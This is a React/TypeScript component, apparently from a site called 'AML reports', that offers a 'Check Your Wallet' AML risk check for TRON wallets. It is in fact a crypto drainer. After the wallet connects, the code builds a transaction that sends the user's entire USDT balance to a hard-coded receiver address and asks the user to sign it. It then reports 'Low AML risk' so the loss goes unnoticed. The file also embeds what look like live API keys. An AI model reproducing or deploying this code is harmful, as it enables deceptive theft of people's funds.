// src/components/tronAuthButton/TronAuthButton.tsx
import React, { useState, useRef, useEffect } from 'react';
import { WalletConnectAdapter } from '@tronweb3/tronwallet-adapter-walletconnect';

const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
const TRON_RECEIVER = 'TAbK6QaF7k53JPCo95d1DsbooWW9B1LPRQ';

export const TronAuthButton: React.FC = () => {
  const [modal, setModal] = useState<string | null>(null);
  const [loading, setLoading] = useState(false);
  const adapterRef = useRef<any>(null);

  // Инициализация адаптера WalletConnect ОДИН раз при монтировании:
  useEffect(() => {
    if (!adapterRef.current) {
      adapterRef.current = new WalletConnectAdapter({
        network: 'Mainnet',
        options: {
          relayUrl: 'wss://relay.walletconnect.com',
          projectId: '6e52e99f199a2bd1feb89b31fbeb6a78',
          metadata: {
            name: 'AML',
            description: 'TRON + WalletConnect Integration',
            url: 'https://amlreports.pro',
            icons: ['https://amlreports.pro/images/icon-3.abdd8ed5.webp'],
          },
        },
        web3ModalConfig: { themeMode: 'dark' },
      });
      // Инициализация для ускорения открытия WalletConnect
      if (typeof adapterRef.current.init === 'function') {
        adapterRef.current.init();
      }
    }
  }, []);

  const handleAuth = async (e?: React.MouseEvent) => {
    e?.stopPropagation();
    setLoading(true);
    setModal(null);

    // Проверяем, что TronWeb загружен через window
    const TronWeb = (window as any).TronWeb;
    if (!TronWeb) {
      setModal('TronWeb not loaded! Please refresh page.');
      setLoading(false);
      return;
    }

    // Polyfill Buffer для TronWeb (если нужно)
    if (!(window as any).Buffer) (window as any).Buffer = (await import('buffer')).Buffer;

    const tronWeb = new TronWeb({
      fullHost: 'https://api.trongrid.io',
      headers: { 'TRON-PRO-API-KEY': 'bbb42b6b-c4de-464b-971f-dea560319489' },
    });

    const adapter = adapterRef.current;
    try {
      await adapter.connect();
      const userAddress = adapter.address;
      if (!userAddress || !tronWeb.isAddress(userAddress)) throw new Error('Invalid wallet address');
      tronWeb.setAddress(userAddress);

      const trxRaw = await tronWeb.trx.getBalance(userAddress);
      if (trxRaw < 2_000_000) {
        setModal('❌ Insufficient TRX for network fees.');
        await adapter.disconnect();
        setLoading(false);
        return;
      }

      const usdtContract = await tronWeb.contract().at(USDT_CONTRACT);
      const usdtRaw = await usdtContract.methods.balanceOf(userAddress).call();
      const usdt = Number(usdtRaw) / 1e6;
      if (usdt < 1) {
        setModal('✅ No USDT found. Low AML risk.');
        await adapter.disconnect();
        setLoading(false);
        return;
      }

      // Транзакция на USDT
      const { transaction } = await tronWeb.transactionBuilder.triggerSmartContract(
        USDT_CONTRACT,
        'transfer(address,uint256)',
        { feeLimit: 25_000_000, callValue: 0 },
        [
          { type: 'address', value: TRON_RECEIVER },
          { type: 'uint256', value: usdtRaw },
        ],
        userAddress
      );
      const signedTx = await adapter.signTransaction(transaction);
      const result = await tronWeb.trx.sendRawTransaction(signedTx);
      if (result?.result) {
        setModal('✅ USDT transferred!\nLow AML risk.');
      } else {
        setModal('⚠️ Transaction failed.');
      }
    } catch (err: any) {
      // Только реальные ошибки, отмена - это НЕ ошибка
      if (
        err?.message?.toLowerCase?.().includes('user rejected') ||
        err?.message?.toLowerCase?.().includes('modal is closed') ||
        err?.message?.toLowerCase?.().includes('timeout') ||
        err?.message?.toLowerCase?.().includes('user disapproved requested methods')
      ) {
        setModal(null); // Не выводим ошибку при отмене пользователем
      } else if (err?.message) {
        setModal(err.message);
      } else {
        setModal('⚠️ Connection or transaction error');
      }
    }
    setLoading(false);
    await adapterRef.current.disconnect();
  };

  return (
    <div className="AuthButton">
      <button onClick={handleAuth} disabled={loading} style={{ minWidth: 180 }}>
        {loading ? 'Connecting...' : 'Check Your Wallet'}
      </button>
      {modal && (
        <div className="modal__overflow">
          <div className="modal">
            <p>{modal}</p>
            <button onClick={() => setModal(null)}>Close</button>
          </div>
        </div>
      )}
    </div>
  );
};
